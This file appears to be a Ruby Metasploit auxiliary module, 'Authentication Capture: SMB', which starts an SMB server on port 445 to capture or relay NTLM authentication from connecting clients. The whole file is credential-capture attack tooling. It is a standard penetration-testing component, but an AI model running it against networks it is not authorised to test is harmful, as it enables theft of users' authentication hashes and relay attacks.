##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Server
  include ::Msf::Exploit::Remote::SMB::Server::HttpRelay

  def initialize
    super({
            'Name' => 'Authentication Capture: SMB',
            'Description' => %q{
      },
            'Author' => [
              'bwatters-r7',          # Port of existing module to use RubySMB::Server
            ],
            'License' => MSF_LICENSE,
            'Actions' => [[ 'Relay', { 'Description' => 'Run SMB capture server' } ]],
            'PassiveActions' => [ 'Relay' ],
            'DefaultAction' => 'Relay'
          })

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ]
    )

    deregister_options('SMBServerIdleTimeout')
  end

  def start_service(opts = {})
    ntlm_provider = HTTPRelayNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']
    validate_smb_hash_capture_datastore(datastore, ntlm_provider)
    opts[:gss_provider] = ntlm_provider
    super(opts)
  end

  def on_client_connect(client)
    print_good('Received SMB connection on Auth Capture Server!')

  end

  alias :run :exploit
end
